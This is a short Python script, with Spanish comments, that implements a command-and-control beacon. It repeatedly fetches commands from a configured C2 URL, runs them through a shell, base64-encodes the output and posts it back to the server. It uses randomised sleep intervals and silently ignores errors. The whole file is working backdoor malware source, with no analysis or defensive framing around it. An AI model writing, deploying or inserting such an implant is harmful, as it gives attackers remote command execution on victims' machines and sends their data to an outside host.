import requests
import subprocess
import time
import random
import base64
from config import C2_URL, SLEEP_MIN, SLEEP_MAX

def beacon():
    while True:
        try:
            # Solicita comandos al C2
            response = requests.get(C2_URL)
            if response.status_code == 200:
                command = response.text.strip()
                if command:
                    if command.lower() == "exit":
                        break
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    result = output.stdout + output.stderr
                    # Codifica y envía resultado
                    encoded = base64.b64encode(result.encode()).decode()
                    requests.post(C2_URL, data={"response": encoded})
        except Exception:
            pass

        sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
        time.sleep(sleep_time)

if __name__ == "__main__":
    beacon()
